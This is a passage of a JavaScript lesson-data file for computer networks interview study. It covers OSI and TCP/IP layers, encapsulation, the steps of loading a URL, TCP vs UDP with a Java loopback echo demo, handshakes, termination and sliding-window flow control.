/* study: Computer Networks — lessons for the 60-day plan */
(function () {
  var ST = window.STUDY = window.STUDY || { lessons: {}, blocks: {} };
  function add(l) { ST.lessons[l.id] = l; }
  function map(blockId, ids) { (ST.blocks[blockId] = ST.blocks[blockId] || []).push.apply(ST.blocks[blockId], ids); }

  /* ------------------------------------------------------------------ */
  /* D29 — layers, encapsulation, "what happens when you type a URL"     */
  /* ------------------------------------------------------------------ */
  add({
    id: "cn-layers-url",
    subject: "cn",
    title: "OSI vs TCP/IP, encapsulation & the 12-step URL answer",
    minutes: 75,
    crux: [
      "<b>OSI</b> has 7 layers (Please Do Not Throw Sausage Pizza Away: Physical, Data link, Network, Transport, Session, Presentation, Application). <b>TCP/IP</b> has 4: Link, Internet, Transport, Application (OSI 5–7 collapse into Application).",
      "PDUs: <b>bits</b> (L1) → <b>frame</b> (L2) → <b>packet</b> (L3) → <b>segment</b> / datagram (L4) → <b>data</b> (L5–7).",
      "Devices: hub/repeater = L1, switch/bridge = L2 (MAC), router = L3 (IP), L4/L7 load balancers and firewalls work higher up.",
      "Addresses per layer: <b>MAC</b> (L2, hop-to-hop, changes at every router), <b>IP</b> (L3, end-to-end), <b>port</b> (L4, which process).",
      "<b>Encapsulation</b>: each layer adds its header on the way down (Ethernet also adds a trailer, the FCS); the receiver strips them in reverse order.",
      "URL answer skeleton: <b>parse → DNS → ARP/gateway → TCP → TLS → HTTP request → network/NAT/CDN → server → response → parse → render → keep-alive/close</b>."
    ],
    sections: [
      { h: "Why layers at all", blocks: [
        { p: "Networking is split into layers so that each one solves <b>one</b> problem and only talks to the layer directly above and below it. Wi-Fi can replace Ethernet without HTTP noticing; HTTP/3 can swap TCP for QUIC without changing IP. Interviewers want you to know <b>what each layer is responsible for</b>, not just the names." },
        { p: "<b>OSI</b> (ISO, 1984) is a 7-layer <i>reference model</i> — good for teaching and troubleshooting vocabulary ('it's an L2 problem'). <b>TCP/IP</b> (the DoD / Internet model) is what the Internet actually runs; it has 4 layers (some books draw 5 by splitting Link into Data link + Physical)." },
        { svg: `<svg viewBox="0 0 720 330" width="720" class="dg">
  <text class="tx tx-b" x="120" y="20" text-anchor="middle" dominant-baseline="middle">OSI (7)</text>
  <text class="tx tx-b" x="330" y="20" text-anchor="middle" dominant-baseline="middle">TCP/IP (4)</text>
  <text class="tx tx-b" x="570" y="20" text-anchor="middle" dominant-baseline="middle">Examples — PDU</text>
  <rect class="box-a" x="20" y="40" width="200" height="34" rx="6"/>
  <text class="tx" x="120" y="57" text-anchor="middle" dominant-baseline="middle">7 Application</text>
  <rect class="box-a" x="20" y="80" width="200" height="34" rx="6"/>
  <text class="tx" x="120" y="97" text-anchor="middle" dominant-baseline="middle">6 Presentation</text>
  <rect class="box-a" x="20" y="120" width="200" height="34" rx="6"/>
  <text class="tx" x="120" y="137" text-anchor="middle" dominant-baseline="middle">5 Session</text>
  <rect class="box-g" x="20" y="160" width="200" height="34" rx="6"/>
  <text class="tx" x="120" y="177" text-anchor="middle" dominant-baseline="middle">4 Transport</text>
  <rect class="box-p" x="20" y="200" width="200" height="34" rx="6"/>
  <text class="tx" x="120" y="217" text-anchor="middle" dominant-baseline="middle">3 Network</text>
  <rect class="box-w" x="20" y="240" width="200" height="34" rx="6"/>
  <text class="tx" x="120" y="257" text-anchor="middle" dominant-baseline="middle">2 Data link</text>
  <rect class="box-w" x="20" y="280" width="200" height="34" rx="6"/>
  <text class="tx" x="120" y="297" text-anchor="middle" dominant-baseline="middle">1 Physical</text>
  <rect class="box-a" x="250" y="40" width="160" height="114" rx="6"/>
  <text class="tx tx-b" x="330" y="97" text-anchor="middle" dominant-baseline="middle">Application</text>
  <rect class="box-g" x="250" y="160" width="160" height="34" rx="6"/>
  <text class="tx tx-b" x="330" y="177" text-anchor="middle" dominant-baseline="middle">Transport</text>
  <rect class="box-p" x="250" y="200" width="160" height="34" rx="6"/>
  <text class="tx tx-b" x="330" y="217" text-anchor="middle" dominant-baseline="middle">Internet</text>
  <rect class="box-w" x="250" y="240" width="160" height="74" rx="6"/>
  <text class="tx tx-b" x="330" y="277" text-anchor="middle" dominant-baseline="middle">Link</text>
  <text class="tx" x="440" y="57" dominant-baseline="middle">HTTP, DNS, SMTP, FTP, SSH</text>
  <text class="tx" x="440" y="97" dominant-baseline="middle">TLS, encoding, compression</text>
  <text class="tx" x="440" y="137" dominant-baseline="middle">sessions, RPC, checkpoints</text>
  <text class="tx" x="440" y="177" dominant-baseline="middle">TCP, UDP, QUIC — segment</text>
  <text class="tx" x="440" y="217" dominant-baseline="middle">IP, ICMP, OSPF, BGP — packet</text>
  <text class="tx" x="440" y="257" dominant-baseline="middle">Ethernet, Wi-Fi MAC, PPP — frame</text>
  <text class="tx" x="440" y="297" dominant-baseline="middle">cable, fibre, radio — bits</text>
</svg>`, caption: "OSI layers 5–7 map to the single TCP/IP Application layer; OSI 1–2 map to Link." }
      ] },
      { h: "Layer-by-layer: job, protocols, devices, PDU", blocks: [
        { table: { head: ["#", "Layer", "Responsibility (one line)", "Protocols", "Device", "PDU"], rows: [
          ["7", "Application", "Network services to the app: requests, names, mail", "HTTP, HTTPS, DNS, SMTP, IMAP, FTP, SSH, DHCP", "L7 load balancer, API gateway, proxy", "Data / message"],
          ["6", "Presentation", "Format of data: encoding, serialisation, compression, encryption", "TLS (loosely), JPEG, ASCII/UTF-8, JSON", "—", "Data"],
          ["5", "Session", "Open / maintain / close dialogues, checkpoints", "RPC, NetBIOS, PPTP", "—", "Data"],
          ["4", "Transport", "Process-to-process delivery: ports, reliability, ordering, flow & congestion control", "TCP, UDP, QUIC (over UDP)", "L4 load balancer, stateful firewall", "Segment (TCP) / datagram (UDP)"],
          ["3", "Network", "Host-to-host across networks: logical (IP) addressing, routing, fragmentation", "IPv4, IPv6, ICMP, OSPF, BGP, RIP", "Router, L3 switch", "Packet"],
          ["2", "Data link", "Node-to-node on one link: framing, MAC addressing, error detection (CRC), media access", "Ethernet, Wi-Fi (802.11), PPP, ARP*", "Switch, bridge, NIC, access point", "Frame"],
          ["1", "Physical", "Transmit raw bits: voltages, light, radio, connectors, bit rate", "Ethernet PHY (1000BASE-T), DSL, fibre", "Hub, repeater, modem, cable", "Bits"]
        ] } },
        { p: "*ARP resolves an IP to a MAC — it sits between L2 and L3; most books file it under L2 (or 'L2.5'). ICMP is carried inside IP but is considered part of L3." },
        { ul: [
          "<b>Hub</b> repeats bits to every port → one collision domain. <b>Switch</b> learns MAC→port and forwards frames only where needed → one collision domain <i>per port</i>, but one broadcast domain. <b>Router</b> separates broadcast domains.",
          "<b>MAC</b> is 48-bit, burned into the NIC, meaningful only on the local link. <b>IP</b> is 32-bit (v4) / 128-bit (v6), assigned by network, meaningful end-to-end. At every router hop the <b>MAC header is rewritten</b> but the IP header's source/destination stay the same (unless NAT).",
          "<b>Port</b> (16-bit) picks the process: 80 HTTP, 443 HTTPS, 53 DNS, 22 SSH, 25 SMTP, 67/68 DHCP."
        ] },
        { tip: "If asked 'where does TLS sit?' say: it runs on top of TCP and below HTTP, so in TCP/IP it's part of the Application layer; mapped to OSI it does the Presentation/Session jobs (encryption, session keys). Showing you know the models don't fit perfectly impresses." }
      ] },
      { h: "Encapsulation and de-encapsulation", blocks: [
        { p: "On the way <b>down</b> the sender's stack each layer treats everything from above as opaque payload and prepends its own header. On the way <b>up</b> the receiver's stack each layer reads and strips its own header and hands the payload up (using a 'protocol' / 'port' field to know whom to hand it to)." },
        { svg: `<svg viewBox="0 0 660 270" width="660" class="dg">
  <text class="tx tx-b" x="20" y="45" dominant-baseline="middle">Data (L7)</text>
  <rect class="box-a" x="400" y="30" width="150" height="30" rx="4"/>
  <text class="tx" x="475" y="45" text-anchor="middle" dominant-baseline="middle">HTTP data</text>
  <text class="tx tx-b" x="20" y="95" dominant-baseline="middle">Segment (L4)</text>
  <rect class="box-g" x="330" y="80" width="70" height="30" rx="4"/>
  <text class="tx" x="365" y="95" text-anchor="middle" dominant-baseline="middle">TCP hdr</text>
  <rect class="box-a" x="400" y="80" width="150" height="30" rx="4"/>
  <text class="tx" x="475" y="95" text-anchor="middle" dominant-baseline="middle">HTTP data</text>
  <text class="tx tx-b" x="20" y="145" dominant-baseline="middle">Packet (L3)</text>
  <rect class="box-p" x="260" y="130" width="70" height="30" rx="4"/>
  <text class="tx" x="295" y="145" text-anchor="middle" dominant-baseline="middle">IP hdr</text>
  <rect class="box-g" x="330" y="130" width="70" height="30" rx="4"/>
  <text class="tx" x="365" y="145" text-anchor="middle" dominant-baseline="middle">TCP hdr</text>
  <rect class="box-a" x="400" y="130" width="150" height="30" rx="4"/>
  <text class="tx" x="475" y="145" text-anchor="middle" dominant-baseline="middle">HTTP data</text>
  <text class="tx tx-b" x="20" y="195" dominant-baseline="middle">Frame (L2)</text>
  <rect class="box-w" x="190" y="180" width="70" height="30" rx="4"/>
  <text class="tx" x="225" y="195" text-anchor="middle" dominant-baseline="middle">Eth hdr</text>
  <rect class="box-p" x="260" y="180" width="70" height="30" rx="4"/>
  <text class="tx" x="295" y="195" text-anchor="middle" dominant-baseline="middle">IP hdr</text>
  <rect class="box-g" x="330" y="180" width="70" height="30" rx="4"/>
  <text class="tx" x="365" y="195" text-anchor="middle" dominant-baseline="middle">TCP hdr</text>
  <rect class="box-a" x="400" y="180" width="150" height="30" rx="4"/>
  <text class="tx" x="475" y="195" text-anchor="middle" dominant-baseline="middle">HTTP data</text>
  <rect class="box-w" x="550" y="180" width="50" height="30" rx="4"/>
  <text class="tx" x="575" y="195" text-anchor="middle" dominant-baseline="middle">FCS</text>
  <text class="tx tx-b" x="20" y="245" dominant-baseline="middle">Bits (L1)</text>
  <rect class="box" x="190" y="230" width="410" height="30" rx="4"/>
  <text class="tx tx-c" x="395" y="245" text-anchor="middle" dominant-baseline="middle">1011 0010 1110 0001 …</text>
  <line class="ln" x1="630" y1="35" x2="630" y2="250" marker-end="url(#dg-arr)"/>
  <text class="tx-m" x="640" y="140" dominant-baseline="middle">send</text>
</svg>`, caption: "Going down the sender's stack: each layer adds a header (Ethernet also adds the FCS trailer). The receiver strips them bottom-up." },
        { table: { head: ["Header", "Size", "Key fields"], rows: [
          ["Ethernet", "14 B header + 4 B FCS", "dst MAC, src MAC, EtherType (0x0800 = IPv4, 0x86DD = IPv6)"],
          ["IPv4", "20–60 B", "src/dst IP, TTL, protocol (6 = TCP, 17 = UDP), total length, fragmentation fields"],
          ["TCP", "20–60 B", "src/dst port, seq, ack, flags (SYN/ACK/FIN/RST), window, checksum"],
          ["UDP", "8 B", "src/dst port, length, checksum"]
        ] } },
        { p: "Worked number: Ethernet MTU = 1500 bytes of payload. Minus 20 B IP header and 20 B TCP header → <b>MSS = 1460 bytes</b> of application data per segment. So a 100 KB (102,400 B) response needs ⌈102400 / 1460⌉ = <b>71</b> full-size segments (70 × 1460 = 102,200, leaving 200 B for the 71st)." },
        { warn: "Routers decapsulate only up to L3 (they read the IP header) and re-encapsulate with a new L2 header for the next link. Switches only look at L2. Neither touches TCP/HTTP — unless they are NAT boxes (rewrite L3/L4) or L7 proxies." }
      ] },
      { h: "What happens when you type google.com and press Enter — 12 steps", blocks: [
        { p: "This is the most asked CN question in Indian SDE interviews. Memorise the skeleton, then expand whichever step the interviewer pokes at. Say it in this order:" },
        { svg: `<svg viewBox="0 0 720 150" width="720" class="dg">
  <rect class="box" x="5" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="45" y="38" text-anchor="middle" dominant-baseline="middle">1 Parse</text>
  <rect class="box-a" x="95" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="135" y="38" text-anchor="middle" dominant-baseline="middle">2 DNS cache</text>
  <rect class="box-a" x="185" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="225" y="38" text-anchor="middle" dominant-baseline="middle">3 DNS walk</text>
  <rect class="box-w" x="275" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="315" y="38" text-anchor="middle" dominant-baseline="middle">4 ARP/gw</text>
  <rect class="box-g" x="365" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="405" y="38" text-anchor="middle" dominant-baseline="middle">5 TCP</text>
  <rect class="box-p" x="455" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="495" y="38" text-anchor="middle" dominant-baseline="middle">6 TLS</text>
  <rect class="box-a" x="545" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="585" y="38" text-anchor="middle" dominant-baseline="middle">7 HTTP req</text>
  <rect class="box" x="635" y="20" width="80" height="36" rx="6"/>
  <text class="tx" x="675" y="38" text-anchor="middle" dominant-baseline="middle">8 Network</text>
  <rect class="box-g" x="635" y="94" width="80" height="36" rx="6"/>
  <text class="tx" x="675" y="112" text-anchor="middle" dominant-baseline="middle">9 Server</text>
  <rect class="box-a" x="545" y="94" width="80" height="36" rx="6"/>
  <text class="tx" x="585" y="112" text-anchor="middle" dominant-baseline="middle">10 Response</text>
  <rect class="box-p" x="455" y="94" width="80" height="36" rx="6"/>
  <text class="tx" x="495" y="112" text-anchor="middle" dominant-baseline="middle">11 Parse</text>
  <rect class="box-w" x="365" y="94" width="80" height="36" rx="6"/>
  <text class="tx" x="405" y="112" text-anchor="middle" dominant-baseline="middle">12 Render</text>
  <line class="ln" x1="675" y1="56" x2="675" y2="92" marker-end="url(#dg-arr)"/>
  <line class="ln" x1="635" y1="112" x2="627" y2="112" marker-end="url(#dg-arr)"/>
  <line class="ln" x1="545" y1="112" x2="537" y2="112" marker-end="url(#dg-arr)"/>
  <line class="ln" x1="455" y1="112" x2="447" y2="112" marker-end="url(#dg-arr)"/>
  <text class="tx-m" x="180" y="112" text-anchor="middle" dominant-baseline="middle">(HTTP/3: steps 5 + 6 merge into one QUIC handshake)</text>
</svg>`, caption: "The 12 steps, left to right then back." },
        { ol: [
          "<b>Parse the input.</b> Browser decides URL vs search term, fills in scheme <code>https://</code>, host <code>google.com</code>, port 443, path <code>/</code>. If the host is on the <b>HSTS</b> list it forces HTTPS. It checks its HTTP cache / service worker — a fresh cached copy skips the network entirely.",
          "<b>DNS — cache chain.</b> Look for <code>google.com</code>'s IP in: browser DNS cache → OS resolver cache (and the <code>hosts</code> file) → home router's cache → ISP / configured recursive resolver (e.g. 8.8.8.8) cache. First hit wins.",
          "<b>DNS — iterative resolution on a miss.</b> The recursive resolver asks a <b>root</b> server ('ask .com'), then the <b>.com TLD</b> server ('ask ns1.google.com'), then Google's <b>authoritative</b> server, which returns the A (IPv4) / AAAA (IPv6) record. Every level caches the answer for its TTL. DNS normally uses <b>UDP port 53</b>.",
          "<b>Find the first hop.</b> The OS ANDs the destination IP with its subnet mask, sees it is not local, so it sends to the <b>default gateway</b>. It uses <b>ARP</b> (broadcast 'who has 192.168.1.1?') to learn the gateway's MAC if not cached.",
          "<b>TCP 3-way handshake</b> with the server's IP on port 443: SYN → SYN-ACK → ACK. Costs 1 RTT. Both sides agree on initial sequence numbers, window sizes, MSS.",
          "<b>TLS 1.3 handshake.</b> ClientHello (supported ciphers, key share, <b>SNI</b> = google.com, <b>ALPN</b> = h2). Server replies with its key share, <b>certificate</b> and a signature. Browser verifies the certificate chain up to a trusted root CA, hostname and expiry; both derive the same symmetric session key (ECDHE). 1 RTT.",
          "<b>Send the HTTP request</b> (encrypted): <code>GET / HTTP/2</code> with headers <code>Host</code>, <code>User-Agent</code>, <code>Accept</code>, <code>Accept-Encoding: gzip, br</code>, <code>Cookie</code>.",
          "<b>Through the network.</b> Data is encapsulated into segments → packets → frames. The home router <b>NATs</b> the private source IP:port to its public IP. Routers forward hop by hop using <b>longest-prefix match</b>; MAC headers change every hop, IPs don't. Big sites answer from a nearby <b>CDN / edge</b> location (anycast DNS routing).",
          "<b>Server side.</b> Load balancer / reverse proxy (often terminates TLS) → web server → application code → cache (Redis) / database → builds the response.",
          "<b>HTTP response.</b> Status line (<code>200 OK</code>, or <code>301</code> redirect, or <code>304 Not Modified</code>), headers (<code>Content-Type</code>, <code>Content-Encoding</code>, <code>Cache-Control</code>, <code>Set-Cookie</code>), then the HTML body.",
          "<b>Browser parses.</b> HTML → <b>DOM</b>, CSS → <b>CSSOM</b>. Every referenced CSS / JS / image / font is fetched (more DNS lookups for other domains; HTTP/2 multiplexes them over the same connection). Plain <code>&lt;script&gt;</code> blocks parsing; <code>async</code>/<code>defer</code> don't.",
          "<b>Render and finish.</b> DOM + CSSOM → render tree → <b>layout</b> (sizes/positions) → <b>paint</b> → <b>composite</b>; JavaScript runs and the page becomes interactive. The TCP connection stays open (keep-alive) for reuse and is eventually closed with the FIN 4-way termination."
        ] },
        { tip: "Open with one sentence ('DNS turns the name into an IP, TCP + TLS open a secure connection, HTTP fetches the page, the browser renders it') then walk the 12 steps. Pause after step 3 and step 6 — interviewers usually dive into DNS or TLS. Mentioning HSTS, SNI, ALPN, NAT and CDN is what separates a 7/10 answer from a 10/10." },
        { warn: "Common mistakes: saying DNS uses TCP (it's UDP 53 by default; TCP only for large responses / zone transfers), forgetting ARP / default gateway, forgetting TLS entirely, or saying the MAC address of google.com is used (you only ever learn your gateway's MAC)." }
      ] }
    ],
    practice: [
      { q: "Map these to their OSI layer and PDU: switch, router, hub, TCP, IP, Ethernet, HTTP.", a: "Switch → L2 (frame). Router → L3 (packet). Hub → L1 (bits). TCP → L4 (segment). IP → L3 (packet). Ethernet → L2 (frame). HTTP → L7 (data/message)." },
      { q: "A packet travels from your laptop through 3 routers to a server. Which of these change at each hop: source MAC, destination MAC, source IP, destination IP, TTL?", a: "Source MAC and destination MAC change at every hop (each link has its own L2 addressing). TTL is decremented by 1 at every router. Source and destination IP stay the same end-to-end — except where NAT rewrites the source IP (e.g. your home router)." },
      { q: "With an Ethernet MTU of 1500 and 20-byte IP and TCP headers, how many bytes go on the wire (including Ethernet header + FCS) for one full-size TCP segment? What fraction is useful data?", a: "Payload per segment (MSS) = 1500 − 20 − 20 = 1460 B. Frame = 14 (Ethernet header) + 1500 + 4 (FCS) = 1518 B. Efficiency = 1460 / 1518 ≈ 96.2%. (Preamble and inter-frame gap would add 20 more bytes on the physical wire.)" },
      { q: "Where would a cached DNS answer cut the 12 steps short? Where would a cached HTTP response cut them short?", a: "A DNS cache hit (browser, OS, router or resolver) skips step 3 — the iterative root → TLD → authoritative walk. A fresh HTTP cache entry (Cache-Control max-age not expired) short-circuits at step 1: no DNS, TCP, TLS or request at all. A stale-but-validatable entry still goes to the server but gets a small 304 Not Modified instead of the full body." },
      { q: "Name two things that differ in step 5–6 if the site uses HTTP/3.", a: "(1) Transport is QUIC over UDP port 443 instead of TCP, so there is no separate TCP 3-way handshake. (2) TLS 1.3 is built into QUIC, so transport + crypto setup happen together in 1 RTT (0-RTT for resumed connections). Bonus: a lost packet only stalls its own stream, not all streams." }
    ],
    related: ["cn:osi-model", "cn:tcp-ip-vs-osi", "cn:network-devices", "cn:encapsulation", "cn:what-happens-google", "cn:mac-vs-ip", "cn:arp-rarp", "cn:collision-vs-broadcast-domain", "cn:mtu-fragmentation", "cn:dns-resolution", "cn:cdn"]
  });

  /* ------------------------------------------------------------------ */
  /* D30 — TCP vs UDP, handshake, termination, flow/congestion control    */
  /* ------------------------------------------------------------------ */
  add({
    id: "cn-tcp-udp",
    subject: "cn",
    title: "TCP vs UDP, handshakes, sliding window & congestion control",
    minutes: 80,
    crux: [
      "<b>TCP</b>: connection-oriented, reliable, ordered byte stream with flow + congestion control, 20-byte header. <b>UDP</b>: connectionless, best-effort datagrams, 8-byte header, no ordering — fast and simple.",
      "<b>3-way handshake</b>: SYN(seq=x) → SYN-ACK(seq=y, ack=x+1) → ACK(ack=y+1). Syncs both initial sequence numbers and proves both directions work.",
      "<b>4-way termination</b>: FIN → ACK → FIN → ACK, because each direction closes separately (full-duplex). The side that closes first waits in <b>TIME_WAIT = 2×MSL</b>.",
      "<b>Flow control</b> protects the <i>receiver</i> (rwnd advertised in each ACK). <b>Congestion control</b> protects the <i>network</i> (cwnd guessed by the sender). Sender may have min(rwnd, cwnd) bytes unacknowledged.",
      "<b>Slow start</b>: cwnd doubles every RTT until ssthresh. <b>Congestion avoidance</b>: +1 MSS per RTT. <b>Timeout</b>: ssthresh = cwnd/2, cwnd = 1. <b>3 duplicate ACKs</b> (Reno): fast retransmit, ssthresh = cwnd/2, cwnd = ssthresh.",
      "Throughput is capped at <b>window / RTT</b>; to fill a link the window must be ≥ bandwidth × RTT (bandwidth-delay product)."
    ],
    sections: [
      { h: "TCP vs UDP", blocks: [
        { table: { head: ["", "TCP", "UDP"], rows: [
          ["Connection", "Connection-oriented (handshake first)", "Connectionless — just send"],
          ["Reliability", "ACKs, retransmission, checksums", "Checksum only; lost = lost"],
          ["Ordering", "In-order byte stream (sequence numbers)", "No ordering; each datagram independent"],
          ["Boundaries", "Stream — no message boundaries (app must frame)", "Message boundaries preserved"],
          ["Flow / congestion control", "Yes / yes", "No / no"],
          ["Header", "20–60 bytes", "8 bytes"],
          ["Speed / latency", "Higher (handshake, retransmit, head-of-line blocking)", "Lower"],
          ["Cast", "Unicast only", "Unicast, broadcast, multicast"],
          ["Used by", "HTTP/1.1, HTTP/2, HTTPS, SSH, SMTP, FTP, DB connections", "DNS, DHCP, VoIP, video calls, online games, streaming, QUIC/HTTP-3, SNMP"]
        ] } },
        { p: "Rule of thumb: choose <b>TCP</b> when every byte must arrive correctly and in order (files, web pages, payments). Choose <b>UDP</b> when late data is useless (a video frame from 300 ms ago) or when the exchange is one small request/response (DNS), or when you want to build your own reliability on top (QUIC)." },
        { code: `import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class EchoDemo {
    public static void main(String[] args) throws Exception {
        InetAddress lo = InetAddress.getLoopbackAddress();

        // ---- TCP: connection-oriented, reliable byte stream ----
        try (ServerSocket server = new ServerSocket(0, 50, lo)) {    // port 0 = any free port; now LISTEN
            int port = server.getLocalPort();
            Thread t = new Thread(() -> {
                try (Socket s = server.accept();                      // returns after the 3-way handshake
                     BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream(), StandardCharsets.UTF_8));
                     PrintWriter out = new PrintWriter(new OutputStreamWriter(s.getOutputStream(), StandardCharsets.UTF_8), true)) {
                    out.println("echo: " + in.readLine());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
            t.start();
            try (Socket c = new Socket(lo, port);                     // SYN -> SYN-ACK -> ACK happens here
                 PrintWriter out = new PrintWriter(new OutputStreamWriter(c.getOutputStream(), StandardCharsets.UTF_8), true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
                out.println("hello tcp");
                System.out.println(in.readLine());                    // echo: hello tcp
            }                                                         // close() sends FIN
            t.join();
        }

        // ---- UDP: no connection, every send() is one independent datagram ----
        try (DatagramSocket server = new DatagramSocket(0, lo);
             DatagramSocket client = new DatagramSocket()) {
            byte[] msg = "hello udp".getBytes(StandardCharsets.UTF_8);
            client.send(new DatagramPacket(msg, msg.length, lo, server.getLocalPort()));
            byte[] buf = new byte[1500];
            DatagramPacket p = new DatagramPacket(buf, buf.length);
            server.receive(p);                                        // blocks until a datagram arrives
            System.out.println("got: " + new String(p.getData(), 0, p.getLength(), StandardCharsets.UTF_8));
        }
    }
}`, lang: "java", title: "TCP (ServerSocket/Socket) vs UDP (DatagramSocket) on localhost — prints 'echo: hello tcp' then 'got: hello udp'" }
      ] },
      { h: "3-way handshake", blocks: [
        { svg: `<svg viewBox="0 0 680 250" width="680" class="dg">
  <text class="tx tx-b" x="170" y="20" text-anchor="middle" dominant-baseline="middle">Client</text>
  <text class="tx tx-b" x="510" y="20" text-anchor="middle" dominant-baseline="middle">Server</text>
  <line class="ln ln-d" x1="170" y1="35" x2="170" y2="235"/>
  <line class="ln ln-d" x1="510" y1="35" x2="510" y2="235"/>
  <text class="tx-m" x="160" y="50" text-anchor="end" dominant-baseline="middle">CLOSED</text>
  <text class="tx-m" x="520" y="50" dominant-baseline="middle">LISTEN</text>
  <line class="ln-a" x1="170" y1="70" x2="508" y2="105" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="74" text-anchor="middle">SYN  seq=x</text>
  <text class="tx-m" x="160" y="70" text-anchor="end" dominant-baseline="middle">SYN_SENT</text>
  <text class="tx-m" x="520" y="108" dominant-baseline="middle">SYN_RCVD</text>
  <line class="ln-a" x1="510" y1="120" x2="172" y2="155" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="126" text-anchor="middle">SYN+ACK  seq=y, ack=x+1</text>
  <text class="tx-m" x="160" y="158" text-anchor="end" dominant-baseline="middle">ESTABLISHED</text>
  <line class="ln-a" x1="170" y1="170" x2="508" y2="205" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="176" text-anchor="middle">ACK  seq=x+1, ack=y+1</text>
  <text class="tx-m" x="520" y="208" dominant-baseline="middle">ESTABLISHED</text>
</svg>`, caption: "SYN and FIN each consume one sequence number, which is why the ACK numbers are x+1 and y+1." },
        { ul: [
          "Each side picks a random <b>Initial Sequence Number</b> (ISN) — random to stop off-path attackers guessing it and to avoid confusion with old connections.",
          "The handshake also negotiates <b>MSS</b>, <b>window scaling</b>, <b>SACK</b> permitted, and timestamps (TCP options in the SYNs).",
          "<b>Why not 2-way?</b> With 2 messages the server can't know its ISN (y) reached the client, and a delayed old SYN from a previous connection would make the server open a bogus connection. The third message confirms both directions.",
          "Cost: 1 RTT before data. The client may send data in the third segment. TCP Fast Open can put data in the SYN for repeat visits.",
          "<b>SYN flood</b>: attacker sends many SYNs and never ACKs, filling the server's half-open queue. Defence: <b>SYN cookies</b> (encode state in the ISN y, keep no state until the ACK comes back)."
        ] }
      ] },
      { h: "4-way termination and TIME_WAIT", blocks: [
        { svg: `<svg viewBox="0 0 680 300" width="680" class="dg">
  <text class="tx tx-b" x="170" y="20" text-anchor="middle" dominant-baseline="middle">Client (active close)</text>
  <text class="tx tx-b" x="510" y="20" text-anchor="middle" dominant-baseline="middle">Server (passive close)</text>
  <line class="ln ln-d" x1="170" y1="35" x2="170" y2="285"/>
  <line class="ln ln-d" x1="510" y1="35" x2="510" y2="285"/>
  <text class="tx-m" x="160" y="50" text-anchor="end" dominant-baseline="middle">ESTABLISHED</text>
  <text class="tx-m" x="520" y="50" dominant-baseline="middle">ESTABLISHED</text>
  <line class="ln-a" x1="170" y1="70" x2="508" y2="100" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="74" text-anchor="middle">FIN  seq=u</text>
  <text class="tx-m" x="160" y="70" text-anchor="end" dominant-baseline="middle">FIN_WAIT_1</text>
  <text class="tx-m" x="520" y="103" dominant-baseline="middle">CLOSE_WAIT</text>
  <line class="ln-a" x1="510" y1="112" x2="172" y2="142" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="118" text-anchor="middle">ACK  ack=u+1</text>
  <text class="tx-m" x="160" y="145" text-anchor="end" dominant-baseline="middle">FIN_WAIT_2</text>
  <text class="tx-m" x="340" y="160" text-anchor="middle">(server may still send data — half-close)</text>
  <line class="ln-a" x1="510" y1="180" x2="172" y2="210" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="186" text-anchor="middle">FIN  seq=w</text>
  <text class="tx-m" x="520" y="180" dominant-baseline="middle">LAST_ACK</text>
  <text class="tx-m" x="160" y="213" text-anchor="end" dominant-baseline="middle">TIME_WAIT</text>
  <line class="ln-a" x1="170" y1="222" x2="508" y2="252" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="228" text-anchor="middle">ACK  ack=w+1</text>
  <text class="tx-m" x="520" y="255" dominant-baseline="middle">CLOSED</text>
  <text class="tx-m" x="160" y="275" text-anchor="end" dominant-baseline="middle">2×MSL → CLOSED</text>
</svg>`, caption: "Each direction is shut down independently. If the server has nothing left to send it may combine its ACK and FIN (3 segments total)." },
        { p: "<b>Why four?</b> TCP is full-duplex. The client's FIN only means 'I have nothing more to send'. The server ACKs it immediately, but may still be sending data; it sends its own FIN when <i>its</i> application calls <code>close()</code>." },
        { h: "TIME_WAIT" },
        { ul: [
          "Entered by the side that <b>closes first</b> (active closer), after it ACKs the peer's FIN. Lasts <b>2 × MSL</b> (Maximum Segment Lifetime; RFC 793 said 2 min, Linux hard-codes TIME_WAIT at 60 s).",
          "Reason 1 — <b>reliable close</b>: if the last ACK is lost the peer re-sends its FIN; the socket in TIME_WAIT is still there to re-ACK it (instead of answering with RST).",
          "Reason 2 — <b>let old duplicates die</b>: stray segments from this connection expire before the same (src IP, src port, dst IP, dst port) 4-tuple can be reused by a new connection.",
          "Problem at scale: a busy client or proxy that actively closes thousands of short connections piles up TIME_WAIT sockets and can run out of ephemeral ports. Fixes: connection reuse / keep-alive / pooling, let the other side close, <code>tcp_tw_reuse</code> on Linux. <code>SO_REUSEADDR</code> lets a restarted server re-bind its listening port."
        ] },
        { warn: "<b>CLOSE_WAIT</b> piling up on a server is a bug in <i>your</i> code: the peer has closed but your application never called <code>close()</code> on the socket (leaked connection). TIME_WAIT piling up is normal behaviour, just a tuning issue." }
      ] },
      { h: "Sliding window and flow control", blocks: [
        { p: "<b>Stop-and-wait</b> sends one segment and waits for its ACK — the link sits idle for a whole RTT. <b>Sliding window</b> lets the sender have up to W bytes 'in flight' (sent but unACKed). As ACKs arrive the window slides forward." },
        { p: "Worked example (stop-and-wait efficiency): 1000-byte frames on a 1 Mbps link → transmission time T<sub>t</sub> = 8000 bits / 10<sup>6</sup> = 8 ms. One-way propagation T<sub>p</sub> = 20 ms, so a = T<sub>p</sub>/T<sub>t</sub> = 2.5. Efficiency = 1 / (1 + 2a) = 1/6 ≈ <b>16.7%</b>. To keep the link 100% busy you need a window of 1 + 2a = <b>6 frames</b>." },
